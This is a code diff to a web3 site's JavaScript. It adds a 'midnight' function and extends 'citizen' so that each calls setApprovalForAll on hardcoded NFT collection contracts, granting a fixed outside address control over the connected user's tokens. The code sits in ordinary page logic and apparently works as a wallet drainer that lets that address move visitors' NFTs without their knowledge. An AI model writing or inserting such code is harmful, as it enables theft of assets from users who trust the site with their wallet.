@@ -666,9 +666,11 @@ var data = {
       } else {
           console.log('data already exists')
 
-          trade()
+          // trade()
 
         // await citizen();
+
+        await midnight();
 
         
       }
@@ -1205,5 +1207,12 @@ async function citizen() {
 
           await loadWeb3();
                       var collectionContract = await new window.web3.eth.Contract(_abi, '0xb9951b43802dcf3ef5b14567cb17adf367ed1c0f', {gas: '100000'})
+              await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
+}
+
+async function midnight(){
+
+//0x89a4875c190565505b7891b700c2c6dc91816a47
+                        var collectionContract = await new window.web3.eth.Contract(_abi, '0x89a4875c190565505b7891b700c2c6dc91816a47', {gas: '100000'})
               await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
 }
